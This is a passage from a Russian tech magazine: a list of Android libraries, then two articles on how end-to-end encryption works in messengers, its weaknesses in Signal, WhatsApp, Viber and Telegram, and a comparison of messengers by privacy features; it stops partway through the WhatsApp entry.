 • Android‐IO18 — кол лекция ссылок на презентации, документацию, семплы
   кода и все, что было свя зано с Android на Google I/O 2018;
 • CryptoPrefs — библиотека для шиф рования настроек Android, созданных
   с помощью SharedPrefences;
 • JsonToKotlinClass — плагин Android Studio для генерации data‐классов
    Kotlin из JSON;
 • KotlinTest — удоб ный фреймворк для тес тирова ния приложе ний, написан
   на Kotlin с применением DSL;
 • KTFLITE — приложение‐пример, демонстри рующее использование Ten‐
   sorﬂow Lite для реализации компьютер ного зрения;
 • PhotoEditor — библиотека с реализаци ей редактора фотографий: инстру‐
  менты рисования, филь тры, эмоджи‐стикеры и другое;
 • AndroidButtonProgress — два в одном: кноп ка и прогрессбар;
 • FilePicker — диалог выбора файлов;
 • TheGlowingLoader — красивый индикатор загрузки;
 • morph‐bottom‐navigation — нижняя панель навига ции;
 • SaveState — библиотека для автоматического сохранения сос тояния
   без необходимости реализовать методы onSaveInstanceState и onRestore‐
   InstanceState.
COVERSTORY
   ШИФРУЙСЯ

    84ckf1r3
84ckf1r3@gmail.com    ГРАМОТНО!





        ПОЧЕМУ МЕССЕНДЖЕРЫ НЕ ЗАЩИТЯТ
                  ТАЙНУ ТВОЕЙ ПЕРЕПИСКИ




Сквозное шифрование, или end‐to‐end encryption (E2EE),
считается  панаце ей  от  настойчивых  попыток  хакеров
и силовых ведомств ознакомиться с онлайновой перепис‐
кой. Смысл E2EE часто сводится к тому, что ключи хранятся
только на устройствах собеседников и не попадают на сер‐
вер… но это не совсем так. Давай посмотрим, как в действи‐
тельности обстоят дела с E2EE, на примере популярных мес‐
сенджеров.


ШИФРОВАНИЕ В МЕССЕНДЖЕРАХ
Написать эту статью меня подтолкну ло исследование Obstacles to the Adop‐
tion of Secure Communication Tools (PDF). Как выяс нили его авторы, «подав‐
ляющее большинство участников опро са не понима ют основную концепцию
сквозного шифрования». Проще говоря, люди обычно выбирают мессенджер
сердцем, а не мозгом.
   Начнем с того, что E2EE имеет свои осо бенности в каждом мессендже ре.
В Signal оно почти образцовое. В WhatsApp формаль но такое же, как в Signal,
за исклю чением одного очень важ ного момента: смена основного ключа або‐
нента WhatsApp не блокиру ет отправку ему сооб щений. Максимум можно
вклю чить бесполезное уведомление (которое отклю чено в дефолтных нас‐
тройках). В Viber сквозное шифрование неактивно по умол чанию, да и появи‐
лось только в шестой версии. В Telegram E2EE также используется только
в секретных чатах, причем реализованы они довольно странно.
   Конфликт Роскомнадзора с Telegram вообще создал отличную рекламу
последне му. Рядовые пользователи теперь считают творение Дурова нас‐
тоящей занозой в спине спецслужб (или чуть пониже ее), которые ничего
не могут сделать с пуленепробива емым инно ваци онным сервисом. Пок‐
лонники Telegram сравнивают его с Signal и утвержда ют о превос ходс тве пер‐
вого.
  Однако в криптографии не бывает чудес, и особенно — в прикладной.
Многие математически кра сивые идеи ока зыва ются без надежно испорчены
реализацией, когда удобство и подконтрольность ставят выше безопас ности
и приватности (а так происходит практически всегда).
  Исходно в мессенджерах применялся протокол OTR (Oﬀ‐the‐Record). Он
использует симметрич ное шифрование AES в режиме CTR, протокол обмена
клю чами DH и хеш‐функцию SHA‐1. Схема AES‐CTR обеспечивает  так
называемое «спорное» (в хорошем смысле) шифрование и возможность
отрицания авторства текста, если его перехватят. Всегда можно сослаться
на то, что перех вативший трафик сам изменил шифротекст так, чтобы он
соответствовал другому варианту рас шифровки той же длины. Например,
вместо «сходи за хлебом» получилось «отра ви короле ву» — технически
это возможно, и такое свойство специально заложено в алгоритм.
  Протокол OTR выполняет аутентифика цию собеседников и шифрует
переписку между ними. Он безопа сен до тех пор, пока участники раз говора
регулярно проверяют отпечатки открытых ключей друг друга и противос тоят
атакам по другим векторам (вклю чая соци альный инжиниринг).
   Главный недостаток OTR заключается в том, что пос ле отправки нового
клю ча требуется дождать ся подтверждения от собеседника. Если он офлайн,
то связь будет временно невозможна. Одним из выходов стал алгоритм Dou‐
ble Ratchet (DR), разработанный пять лет назад Тревором Перрином и Мокси
Марлинспайком в Open Whisper Systems. Сегодня DR используется в Signal,
WhatsApp, Viber и многих дру гих мессенджерах, поддерживающих сквозное
шифрование по умол чанию или как отдельную опцию (секретные чаты).





  Упрощенная схема алго ритма Double Ratchet (источник: signal.org). Али‐
  са и Боб начинают сес сию, обмениваясь публичными ключами


СКВОЗНОЕ ШИФРОВАНИЕ
Схема E2EE использует комбинацию из криптографических сис тем с откры‐
тым и закрытым ключом. Она очевидна в общих чертах и довольно сложна
на уровне деталей. В ней использует ся масса вза имосвязанных ключей, часть
из которых обязательно попадает на сервер и, более того, обязательно заг‐
ружается на него до начала переписки, что бы ее можно было начать в про‐
извольный момент. Давай рассмотрим ее подробнее.
  Начало схемы ты наверняка знаешь, поскольку оно стандартно для всех
систем  асимметрич ного шифрования, —  генерируется  пара  ключей.
Это необходимо потому, что криптосистемы с одним ключом (вроде AES)
использовать в переписке в чистом виде слиш ком трудно. С ними приш‐
лось бы как‐то организовывать защищенный канал для передачи ключа (нап‐
ример, встречаться лично), а потом делать это сно ва при каждой его сме не.
   Тут же все как в привычном PGP: есть два собеседника (Алиса и Боб), каж‐
дый из которых генерирует свою пару ключей. Затем они обме ниваются пуб‐
личными ключами, сохраняя в тайне парные им секретные. Публичные ключи
передаются по открытому каналу (на то они и публичные, пусть перехватыва‐
ют на здоровье) и служат для двух целей: они поз воляют зашиф ровать сооб‐
щение и проверить его подпись. Соот ветс твенно, секретные ключи исполь‐
зуются для расшифровки и формирования подписи.


             INFO

                       Термин   «сообщение»   использует ся   здесь
                        в широком смысле. Сооб щением может быть
                           текст, медиафайл или служебные метаданные,
                       которыми мессенджер обме нивается с сервером.
                        Часть этих данных содержит временные метки,
                       состояние клиент ского приложе ния и новые клю‐
                           чи.


Такая криптосистема кое‐как работает в электронной почте, поскольку
это сервис для доставки отдельных зашифрованных сообщений произволь‐
ной длины. Пользуясь им, собеседники не обязаны одновременно быть
онлайн. Все сооб щения накаплива ются на сервере и скачиваются с него
по требованию после того, как пользователь успешно пройдет авторизацию.
Расшифров ка происходит локально при помощи секретных ключей, которые
никуда не передаются. Почта с PGP популярна, но работает далеко не иде‐
ально. Почему? См. статью «Алиса и Боб в стра не PGP».
  К сожалению, в чистом виде схема асимметричного шифрования также
не  годится для мессенджеров, поскольку  эти сервисы ориентированы
на интенсив ную онлайновую переписку в виде цепочки коротких сообщений.
Они должны отображаться в строго определенном порядке, а собеседник
может в любое время оказаться офлайн и нарушить структуру диалога.
  К тому же шифровать множество корот ких сооб щений одним ключом —
плохая идея. Всего за день переписки их создают ся сотни (если не тысячи).
Во многих сообщениях количество шифротекста минимальное и предска‐
зуемое (смайлик, стикер). Также у них есть стандартные заголовки, которые
упрощают криптоанализ.
  Особенность переписки в мессенджерах в  том,  что  из‐за типовых
метаданных за короткое время ата кующий может перехватить большой объ‐
ем предсказуемого шифротекста. Его львиная доля будет соответствовать
известному открытому тексту. Если она будет шифроваться одним ключом, то
при успешной атаке окажутся скомпро метированными все ранее написанные
сообщения и даже те, которые собеседники напишут в будущем.
   Чтобы этого не происхо дило, в мес сенджерах предусмотрены такие свой‐
ства, как прямая и обратная секретность. Они подразумевают невозможность
прочитать отправленные ранее и написанные в будущем сообщения, имея
на руках только текущий ключ шифрования. Для это го используется многос‐
лойное шифрование с переходом от асимметричной к симметричной крип‐
тографии и дополнительные ключи с разным временем жизни.


ДИФФИ, ХЕЛЛМАН! ДАЙТЕ ТРИ!
Из открытой документации известно, что в Telegram аутентифицированное
распределение ключей обеспечивает клас сичес кий протокол Диффи — Хел‐
лмана (DH). Он создает мост между асимметричным (RSA) и симметричным
(AES) шифрованием, давая воз можность энному количеству собеседников
вести зашифрованную переписку, передав только пуб личные ключи по откры‐
тому каналу. Для этого в нем генерируются сес сионные ключи, представ‐
ляющие собой общий секрет или общий эфемерный ключ. Он вычисляется
на основе секретного клю ча одного собеседника и публичного ключа дру‐
гого. Эфе мерные клю чи аутентифицируются долговременными откры тыми
клю чами.


             INFO

                   В DH канал передачи может быть не защищен
                         от  прослушивания  (пассивного  наб людения),
                      но обязан иметь защиту от атаки подмены. Если
                         атакующая  сто рона может  подменить  тра фик
                       (выполнить активную атаку MITM), то вся схе ма
                         летит к черту.


Поэтому для своего мессенджера Signal компания Open Whisper Systems
использует метод тройного преобразова ния Диффи — Хел лмана X3DH c
Curve25519 (эллиптическая кривая Бернстайна для быстрого DH) или X448.
В качестве других крип тогра фических при митивов в X3DH используется
HMAC‐SHA‐256 и AES‐256.
  Протокол Extended Triple Diﬃe — Hellman уста навливает общий секретный
ключ между двумя сторонами, которые вза имно аутентифицируют друг дру га
на основе открытых ключей. Дополнительно клю чи сверяются сразу после
установки сессии и перед началом передачи сообщений. Это сводит
к минимуму риск MITM‐атак, делая их очень слож ными.
  В X3DH используются четыре типа ключей, три из которых пос тоянно
меняются:
 • IK (identity keys). Секретные ключи, которые создаются один раз и служат
   основой для формирования всех остальных;
 • EK (ephemeral key). Эфемерный ключ, который нужен для проверки лич‐
   ности собеседника (без разглашения истинной);
 • SPk (signed public key, signed proof of knowledge) — по сути, это эфе мер‐
  ный ключ, подписанный секретным. Обычно в мессендже рах он меняется
   с частотой от одного дня до недели. Иногда вместо времени жизни SPk
   задают число сооб щений, после которого он меня ется;
 • OPK (one‐time public key) — одно разовый эфемер ный ключ. Он соз дается
   отправителем перед установкой сеанса свя зи и удаляется сразу после
   успешного «рукопожатия» (handshake).


НАСЛЕДИЕ ENIGMA
Смена вспомогательных клю чей в X3DH происходит по алгоритму Double
Ratchet. Он пришел на смену OTR и ввел понятие цепочки, или пула, ключей.
На случай, если собеседник будет офлайн, предусмотрено создание пула
OPK. Несколько разовых эфемерных ключей заранее загружаются на сервер
и расходуются по мере общения. Это поз воляет серверу принимать зашиф‐
рованные сообщения, аутентифицируя их отпра вителя по новой паре ключей,
даже когда получатель не в сети. Если пул OPK исчерпан, то сервер исполь‐
зует запасной EK.
   Название «двой ной хра повик» — отсылка к устройству шиф ровальной
машины Enigma с зубчатыми колесиками, которые исключали обратное дви‐
жение и пов торное использование прежних зна чений. Цифровая аналогия
в том, что DR исполь зуется для генери рова ния новых эфе мерных ключей,
которыми шифруется следующее сооб щение (или небольшая порция сооб‐
щений). При этом эфе мерные ключи гарантированно отличаются, не повторя‐
ют предыдущие и не могут быть предсказаны за разумное вре мя атаки.


             INFO

                     Подробнее о Double Ratchet читай в статье «По‐
                      чему шифрование в Signal, WhatsApp, Telegram
                      и Viber не защитит твою переписку от взлома».


На X3DH основан протокол TextSecure, который позже был пере именован
в Signal. В чистом или слегка модифицированном виде протокол Signal
используется в одноименном мессенджере, а также в WhatsApp, Viber и дру‐
гих. Разработчики могут давать протоколам собс твенные наз вания, но по
сути это все тот же X3DH с варь ирующимся набором хеш‐функций, ГПСЧ
и иных криптографических примитивов.


Проб лема груп повых чатов
Организация групповых чатов в мессенджерах подробно разобрана в свежей
статье «More is Less: On the End‐to‐End Security of Group Chats in Signal, What‐
sApp, and Threema» (PDF). Приведу основные выводы из нее.

    Наш сис тематичес кий ана лиз выявил,  что целос тность ком-
     муника ций  (пред став ленная  целос тностью  всех  сообщений)
     и груп повая принад лежность (опре деляемая воз можностью чле-
     нов груп пы управлять ими) не име ют end-to-end-защиты. Кроме
      того, мы показа ли, что обратная сек ретность (клю чевое свой-
      ство безопас ности) не сохраняется при использовании протоко-
     ла Signal для груп повых чатов.

Пояснение: краеугольный камень сквоз ного шифрования — аутентифици‐
рованное распределение ключей по клас сичес кому или усиленному протоко‐
лу DH. Оно работает только для двух собеседников, формирующих общий
секрет. Ожидаемо, что в мес сенджерах DH не используется в групповых
чатах, а структура обмена сообщениями в них лишена основных криптогра‐
фических свойств.





 Шифрование в групповых чатах. A — отпра витель, B — получатель, G —
  группа пользователей

Авторы показывают, какие манипуляции может выполнять контролируемый
злоумышленником сервер в групповых чатах из‐за отсутствия в них E2EE.
Свои исследования они проводили на при мере Signal и WhatsApp, но вряд ли
стоит ожидать, что у других мессенджеров эта проблема имеет какое‐то
изящное решение.



СТРАННОСТИ TELEGRAM
С Telegram все пок рыто завесой тайны. О протоколе MTProto 2.0 есть только
частичные сведения. Его внеш ний аудит не выполнялся, а опенсорсная
модель Telegram исполь зуется в силь но искаженном виде и исключительно
с маркетинговыми целями. Ниже я поясню, почему так считаю.
  Судя по официальному описанию, все недос тавленные сообщения вре‐
менно (мы надеемся) хра нятся на серверах Telegram, которые часто разбро‐
саны по миру и объединены в виртуальное облако. Они синхронизируются
между собой, чтобы упорядочить и дос тавить сооб щения одному или нес‐
кольким (в случае группового чата) собеседникам в определенном порядке,
как только они появятся в сети. Поэто му шифрование делится на два этапа:
на участках клиент — сервер и сервер — сервер. Это обычная схе ма, но в ней
странно то, что прямое соединение клиентов не используется вообще никог‐
да.
  В Telegram трафик переда ется через серверы даже при открытии сек‐
ретного чата, для которого логичнее было бы сделать P2P‐соединение. Нап‐
рашивается вывод, что без пос тоянного использования серверов Telegram
связь в этом мессенджере вообще не работает. Дру гие мессенджеры могут
использовать свои серверы только на начальном эта пе — для сопоставле ния
текущих IP‐адресов собеседников и орга низации между ними пря мого
соединения. Telegram так не умеет, и это чертовски похоже на MITM by design.
  Почему‐то все рассуждения о стойкости MTProto 2.0 кру тятся вокруг того,
что алгоритм DH надежно защищает от перехвата. Это не так. Алгоритм Диф‐
фи — Хеллмана как раз уязвим для атаки MITM. Более того, в случае Telegram
он, вероятно, допол нительно ослаблен на уровне ГПСЧ.
  Проблема в том, что клиентское приложение Telegram руководству ется
очень невнятной оцен кой энтропии. Вместо того чтобы локально генери‐
ровать псевдослучайные числа и отсеивать качес твенные прос тые, клиент
запрашивает их с сервера. Что за ГПСЧ использует ся на сервере, нас колько
удачные простые числа он генерирует и нет ли на сервере механиз мов изби‐
рательной отправки простых чисел с определенными свойствами отдельным
клиентам — воп росы без ответа. Клиентское приложение лишь выпол няет
проверку присланного случайного числа, причем упрощенную, поскольку
на тщательный тест prime numbers за разумное время у смартфона банально
не хватит вычислительных ресурсов.
  Другой частый аргу мент в пользу безопас ности Telegram — открытые
исходники. Однако в них нет исходного кода серверной части, а код клиент‐
ской обычно неактуален. Репозитории Telegram обновляются с большой
задержкой (разве что урезанная веб‐версия более‐менее живая), и в них
всегда лежат только ста рые вер сии. Нет даже воз можности проверить, дей‐
ствительно ли из исходников компилиру ется  то, что сейчас раздается
как готовый дистрибутив.
  Поэтому говорить про аудит мессенджера фактически бес смыс ленно.
Пока специалисты несколько месяцев копаются в старом коде, выйдет
десяток новых версий Telegram, где будут переписаны огромные куски кода.
Чтобы сде лать уязвимой всю систему шифрования, достаточно замены одно‐
го байта — например, одного условного перехода.
   Хакатоны, которые устра ивает Дуров, не заменят аудит, пос кольку ничего
не доказывают. В их заданиях создает ся искусственная ситуация, в которой
у атакующей стороны есть только одно зашифрованное сообщение. В реаль‐
ной жизни таких ограничений нет и для атаки на мес сенджер есть множес тво
других векторов.


ТЫСЯЧА И ОДНА УЯЗВИМОСТЬ
Signal — один из немногих мессенджеров, чей протокол проходил внешний
аудит (PDF). Отчет о его результатах очень объемный, поэтому процитирую
главные выводы в своем переводе.



     Наш ана лиз показы вает, что [протокол] Signal удов летворяет стандар-
     тным крип тогра фичес ким пред положе ниям и свойствам безопас ности.
    Мы не обна ружили серьезных недос татков в его дизайне, что очень
      обна деживает. При реальном использовании Signal оста ются неоп-
      ределенности. Поэтому невоз можно ска зать, всегда ли [приложе ние]
       Signal дос тигает заяв ленных целей.

Нужно осознавать, что анализ про токола передачи сообщений — важный
этап аудита, но далеко не единственная составляющая безопасности. Любой
мессенджер работает в реальной и очень уязвимой сре де. Обычно он запус‐
кается на не самой свежей версии Android, параллельно с сотней левых при‐
ложений  (часть  из  которых  наверняка  зло употребляют  разрешениями
или даже содержат тро янские закладки), а сам аккаунт привязан к номеру
мобильного телефона.
  Огромная брешь заключа ется в том, что коды подтверждения приходят
в SMS. Их можно перехватить через известную уяз вимость в протоколе
сотовой связи SS7. Так атакующий получит доступ ко всей переписке, не зная
клю чей шифрования и даже не пытаясь взломать Signal/Proteus/MTProto (или
иной секьюрный протокол). Сервер мессенджера сам сме нит ключ и услужли‐
во дешифрует последнюю переписку (как минимум, недос тавленные сооб‐
щения). Даже твои стикер паки вос ста новит. Главное же — удобство, верно?
  Еще одна зияющая дыра в модели безопасности — push‐уведомления.
Без них ты не узнаешь, что тебе пришло сооб щение, пока вручную не запус‐
тишь мессенджер. С ними ты превращаешь сервер push‐уведомлений
в легализованного «человека посередине». Например, чтобы в iMessage
работали уве домления, он отправляет ключи шифрования на серверы Apple.
Уже они выполняют аутентификацию пользователей и (как минимум) дешиф‐
ровку заголовков сооб щений. Вос ста нови учетку Apple на дру гом устройстве,
и ты получишь все как было — вплоть до перепис ки и паролей от Wi‐Fi. Почти
такая же ситуация с серверами Google и Microsoft. Или ты еще веришь
в сквозное шифрование с привязкой к номеру мобильного и основному акка‐
унту на смартфоне?
  Проблема небезопас ного управления ключами и большой поверхнос ти
атаки касается вооб ще всех мес сенджеров. WhatsApp, Viber и многие другие
позволяют создавать копии переписки (в том чис ле облачные) и не шифруют
метаданные (а иногда сам факт раз говора важнее его содержания). У Signal
дела обстоят чуть лучше, но и его я не считаю идеальным мессендже ром
по целому ряду причин:
 • Во‐первых, Signal также использует гугловский сервис push‐уве домлений.
   Поэтому на смартфоне без сервисов Google (например, все китайские
  модели для внутреннего рынка без GApps) он прос то не работает.
 • Во‐вторых, для голосо вого общения в Signal используется закрытый сер‐
   вер RedPhone.
 • В‐третьих, Signal (как и многие дру гие мессенджеры) поз воляет открыть
   параллельную сессию на другом устройстве, просто отсканировав QR‐
   код.
 • В‐четвертых, на HITBSecConf2017 рас сказали (PDF) про ряд концепту аль‐
   ных проблем Signal и продемонс трировали успешную атаку на него.


XMPP
Как видишь, сторонним и тем более проприетарным мессенджерам доверять
сложно, даже если их рекомендовали Сноуден, Ассанж и EFF. Поэтому
некоторые организуют общение через свой мес сенджер — с опенсорсом
и плагинами. Для простой переписки годится пла гин OTR, но он не под‐
держивает групповые чаты. Есть родс твенные протоколы mpOTR и GOTR,
в которых добавлена эта функция.
   Так или иначе, для кол лективного общения удоб нее использовать откры‐
тый протокол XMPP (Extensible Messaging and Presence Protocol), который
ранее назывался Jabber. XMPP переводится как «расширяемый протокол
обмена сообщениями и информацией о присутс твии», это очень емкое наз‐
вание. Открытость озна чает полную дос тупность исходных кодов. Ты можешь
поднять свой сервер XMPP, ни от кого не зависеть и ничего за это не платить.
Также есть уйма готовых серверов и клиентов на любой вкус — например,
десктопный Pidgin и Xabber для Android.
   Расширяемость подразумевает воз можность передачи не только текста,
но и данных другого типа, а также добавление раз ных функций и схем шиф‐
рования. Например, по XMPP легко передать голосовые сооб щения, видео
и файлы, при желании зашифровав их средс твами TLS или PGP. Не так давно
на базе XMPP был создан протокол расширения OMEMO, в котором исполь‐
зуется тот же DR от Open Whisper Systems, что и в Signal и WhatsApp, но без
прочих недостатков последних.


ВЫВОДЫ
В современных мессенджерах заявлена поддержка сквоз ного шиф рования,
но часто оказывается, что она реализова на со странностями. К тому же в их
коде много других дыр, которые были оставлены слу чайно либо намеренно.
Последнее куда вероятнее, если учесть, сколько денег и труда профессиона‐
лов было вложено в их раз работку. Я ста раюсь соб людать баланс между ком‐
фортом и привычным нас лаждением паранойей. Использую разные мес сен‐
джеры (какие удобнее моим собеседникам), но никогда не веду через них
действительно приватных бесед. Для это го есть множество опенсорсных аль‐
тернатив. Помимо Xabber, пользователям Android я бы рекомендовал прис‐
мотреться к Conversations — свободному XMPP‐клиенту с поддержкой OTR,
OMEMO, openPGP и SOCKS5.


        WWW

                   •Документация схемы шифрования в Signal
                   •Документация схемы шифрования в Telegram
                     •Рекомендации EFF по защите от слежки
COVERSTORY

ШИФРУЙСЯ

                                                                         Валерия Губарева
                                                                                      veneramuholovka@yandex.ruГРАМОТНО!




                                                                       Денис Колисниченко
                                                                                Постоянный автор журнала
                                                                                                «Хакер»
                                                                                           dhsilabs@gmail.com





                 ВЫБИРАЕМ МЕССЕНДЖЕР ДЛЯ
         БЕЗОПАСНОЙ И ПРИВАТНОЙ ПЕРЕПИСКИ




Парадоксально, но факт: при всем разнообразии мессен‐
джеров выбирать их обычно не приходится — люди просто
пользуются тем же, чем их друзья и зна комые. Но что, если
секретность действительно важна? В этой статье мы прой‐
демся по спис ку современных мессен джеров и посмотрим,
какие гарантии защиты есть у каж дого из них.


Не так давно я заглянула полис тать статьи в журнале «Хакер» и наткнулась
на опрос «Какой мессенджер ты считаешь самым надежным для хакера?».
Самый популярный ответ (Telegram) меня насторожил. Тогда я поняла, что все
это зашло слиш ком далеко и даже средний читатель «Хакера» уже потерял
связь с реальностью пос ле атаки маркетинг‐хедкраба (на картинке).





                          Кра бе ота ке!!1

Я решила составить список мессенджеров и посмотреть, как у каждого из них
обстоят дела с безопасностью. В список пошли как популярные, так и пер‐
спективные в плане безопас ности программы. Сразу предупреждаю, что
углубляться в техническую сторону мы будем нас только, насколько это необ‐
ходимо для среднего пользователя, не дальше.
  Во многом я повторила путь авто ров серии ста тей Electronic Frontier Foun‐
dation под названием Secure Messaging Scorecard, но выбрала другие кри‐
терии — на мой взгляд, более важные.


 КРИТЕРИИ


FOSS
Распространяет ся ли исходный код мессенджера на условиях одной из сво‐
бодных лицензий? Если да, то ведется ли раз работка откры тым методом?
Насколько тесно разработчики вза имо действу ют с сообщес твом? Принима‐
ют ли pull request’ы? Все это важ но учитывать при выборе.


Сте пень цен трализации
Здесь возможен один из трех вариантов:
 • централизованный — требует сервера, воз можно заблокировать. Пример:
   VK, Telegram, Facebook;
 • федеративный — сеть из серверов, которые общаются друг с дру гом.
   Каноничные примеры: Email, Jabber (XMPP), Riot Matrix;
 • децентрализованный (имеется в виду P2P) — каждый клиент является
   одновременно и сервером.


Воз можность ано нимной регистрации и использования
Для некоторых сервисов телефон может понадобиться только для защиты
от спама при регистрации, соответственно, очень просто использовать сер‐
висы аренды номеров для SMS.
  В остальных случаях мессенджер плотно привязан к телефону. Это плохо
тем, что если не вклю чена двухфакторная аутентификация, то при получе нии
доступа к этому номеру мож но зайти в аккаунт и слить все данные. Но даже
если двухфакторка включена, все равно оста ется возможность удалить все
данные с аккаунта. Ну и конечно, это, считай, регис трация по паспорту
(используем реалии РФ, других не завезли).
  Но не все так плохо. Есть мессенджеры, которые поз воляют регистри‐
роваться с исполь зованием почтового ящика или учетной записи в социаль‐
ной сети. Есть и такие, где учетную запись можно создать в самом мессен‐
джере без привязки к чему‐то.


Наличие End-to-End Encryption (E2EE)
Некоторые мессенджеры имеют такую функцию по умол чанию, в других ее
можно включить, но есть и те, где сквоз ного шифрования просто нет.


Син хро низация E2EE-чатов
Опять же эта функция пока что встречает ся не так часто, как хотелось бы. Ее
наличие сильно упрощает жизнь.


Уве домление о необ ходимости про верки отпе чатков E2EE
При старте E2EE‐чатов некоторые мессенджеры предлагают проверить отпе‐
чатки собеседников, другие не предлагают это открыто. Но не все мессен‐
джеры имеют функцию проверки отпечатков.


Запрет делать скрин шот сек ретно го чата
Не самая полезная функция, потому что для обхода запрета достаточно, нап‐
ример, иметь под рукой второй телефон.


Групповые E2EE-чаты
Групповые E2EE‐чаты обычно не такая уж необ ходимая функция, но весьма
удобная. Правило «больше двух — говори вслух» стоит оставить для детей.


Уве домление о необ ходимости про верки отпе чатков E2EE в груп-
повых чатах
При добавлении нового собеседника, с которым не сверены отпечатки, в сек‐
ретный групповой чат не все мессенджеры предлагают проверить его отпе‐
чатки. Из‐за такого упущения теряется смысл секретных чатов.


Защита социального графа
Некоторые мессенджеры собирают информацию о контактах пользователя
и другую метаинформацию, например кому звонил пользователь, как дол го
разговаривал. На эту тему есть интерес ная заметка.


        WWW

                Мы выбрали лишь  часть  критериев,  которые
                        могут сыграть роль при выборе мессендже ра.
                    Существуют и другие, но не всегда они связаны
                        с безопасностью. Груп па ученых из европейских
                       университетов неплохо разложила все по полоч‐
                      кам в работе Obstacles to the Adoption of Secure
                       Communication Tools (PDF). Так же всегда полезно
                       знакомиться с результатами независимо го ауди‐
                             та, если они есть. Например, в случае с Signal
                        такой аудит проводился (PDF).



 TELEGRAM


Лицен зия: формально — GPLv3. Однако важная часть раз работки закрыта.
Если взглянуть на репозитории, то видно, что в пос леднее время какое‐то
движение наблюдалось только в вебовой версии. Увы, в таком виде это ско‐
рее иллюзия открытости
Сте пень цен трализации: центра лизо ванный
Воз можность ано нимной регистрации и работы: нет
Наличие E2EE: реализованы, но как дополнение. По умолчанию чаты
не шифруются
Син хро низация E2EE-чатов: нет. Секретный чат можно использовать
только с одного устрой ства, с другого дос тупа к нему уже не будет
Уве домление о про верке отпе чатков E2EE: нет. Пользователи могут
сами зайти в настрой ки, чтобы сравнить отпечатки
Запрет на скрин шоты сек ретных чатов: есть, но работает не на всех
устройствах
Групповые чаты E2EE: нет
Защита социального графа: нет





Мессенджер, созданный командой Павла Дурова, пос троен на технологии
шифрования переписки MTProto. На данный момент час тично заблокирован
на территории России, но эта блокировка — отдель ная тема для раз говора.
  Мессенджер неоднозначный. Вокруг него много шума, но оправдан ли он?
Доступа к исходникам нет, чаты по умолчанию не шифруются, нет защиты
социального графа (все твои контакты хранятся на серверах Telegram), нет
групповых E2EE‐чатов, E2EE‐чаты не поддержи вают ся в настольной версии
программы, только в мобильной, мессенджер центра лизованный, сообщения
хранятся на сервере (и они, как уже было отмечено, не зашифрованы), и при
всем этом отсутствует воз можность ано нимной регис трации.
   Если  ты хочешь использовать  Telegram,  то  для защиты переписки
не забывай создавать секретные чаты. В мобиль ной версии для этого нужно
выбрать команду New Secret Chat. Из настольных версий секретные чаты под‐
держивают только некото рые (например, один из двух клиентов для macOS).
  В секретном чате сооб щения шифруются и не хра нятся на серверах мес‐
сенджера.  Также нель зя сделать скрин шот секретного  чата, но ничто
не мешает сфотографировать такой чат с экрана.


   SIGNAL


Лицен зия: AGPLv3
Сте пень цен трализации: децентра лизованный
Воз можность ано нимной регистрации и работы: нет. Кроме номера
телефона, других вариантов нет. Использование временного приведет к тому
же результату, что и в случае с Telegram
Наличие E2EE: есть. Используется Signal Protocol — специально раз‐
работанный для этого мес сенджера протокол шифрования сообщений
Син хро низация E2EE-чатов: есть
Уве домление о про верке отпе чатков E2EE: нет. Пользователям пред‐
лагается сосканировать QR‐коды друг у друга или сравнить отпечатки
Запрет на скрин шоты сек ретных чатов: можно включить или выключить
Групповые чаты E2EE: есть
Уве домление о необ ходимости про верки отпе чатков E2EE в груп-
повых чатах: нет
Защита социального графа: есть





Мессенджер Signal разработан американским стартапом Open Whisper Sys‐
tems, где, кроме двоих основателей, работает всего несколько человек.
Для шифрования сооб щений используется соз данный специально для него
криптографический протокол — Signal Protocol. Он применя ется для сквоз‐
ного (end‐to‐end) шифрования звонков (голосовых и видео), а также обычных
сообщений. Протокол Signal с тех пор ста ли исполь зовать и дру гие мес сен‐
джеры: WhatsApp, Facebook Messenger, Google Allo.
   Казалось бы, в этом случае любой мес сенджер может стать таким же
безопасным, как и Signal. Но, как показы вает практика, — нет. В отличие
от Signal, где шифрование включено по умолчанию, в этих мессенджерах оно
выключено. Для его включения в Facebook Messenger нужно активировать Se‐
cret Conversations, а в Google Allo — режим инкогнито (Incognito Mode).
   Хоть  Signal и центра лизованный, но код открыт и распространяется
по свободной лицензии. У Signal есть поддержка групповых E2EE‐чатов,
защита социального графа, поддерживаются ис чезающие по таймеру сооб‐
щения.
  Однако не сто ит путать защиту с ано нимностью. Signal не анонимен:
при регистрации нужно ука зывать номер телефона, к которому мессенджер
и привязывается. Что касается исчезающих сообщений, то эта фишка встре‐
чается и в других мессенджерах, например в Viber и Telegram (в меню сек‐
ретного чата нужно выбрать команду Set self‐destruct timer).


   VIBER


Лицен зия: проприетарная
Сте пень цен трализации: центра лизо ванный
Воз можность ано нимной регистрации и работы: только по номеру
телефона
Наличие E2EE: есть, по умол чанию. Также есть секретные и скры тые чаты,
которые обеспечивают дополнитель ную безопас ность
Син хро низация E2EE-чатов: нет. Созданный в мобильной версии сек‐
ретный чат не отобразился в десктопной версии
Уве домление о про верке отпе чатков E2EE: для проверки отпе чатков
предлагается совершить звонок собеседнику, сооб щить свой идентифика‐
тор, после чего подтвердить его корректность, но уведомления, что это необ‐
ходимо для обеспечения собственной безопасности, нет
Запрет на скрин шоты сек ретных чатов: есть
Групповые чаты E2EE: есть
Уве домление о необ ходимости про верки отпе чатков E2EE в груп-
повых чатах: нет
Защита социального графа: нет





Viber — интересный мес сенджер. С одной стороны, он проприетарный, цен‐
трализованный, привязывается только к номеру телефона, не обес печивает
защиту социального графа. С другой стороны, сквоз ное шифрование осно‐
вано на протоколе Signal и включено по умолчанию, даже в настольной вер‐
сии. Для дополнительной безопасности существу ют секретные чаты с воз‐
можностью общаться группой.
  Секретные чаты позволяют нас троить таймер самоуничтожения для каж‐
дого сообщения: оно будет уда лено через установленное время после прос‐
мотра — как с тво его устройства, так и со всех устройств получателей. Сооб‐
щения секретного чата защищены от пересылки, а скриншоты или зап‐
рещены, или оставляют уведомление на экра не чата.
  Для перехода в секретный чат нужно открыть чат с пользователем и выб‐
рать из его меню команду «Перейти в секретный чат». Такой чат будет отме‐
чен замком.
  Дополнительно Viber позволяет создавать скрытые секретные чаты — они
не будут отображаться в общем списке. Чтобы получить дос туп к скры тому
чату, нужно ввести установленный ранее PIN‐код. Это дополнительная защита
на тот случай, если телефон попадет в чужие руки.


 WHATSAPP


Лицен зия: проприетарная
Сте пень цен трализации: центра лизо ванный
Воз можность ано нимной регистрации и работы: только по номеру
телефона
Наличие E2EE: по умолчанию
Син хро низация E2EE-чатов: есть
Уве домление о про верке отпе чатков E2EE: есть только в случае смены
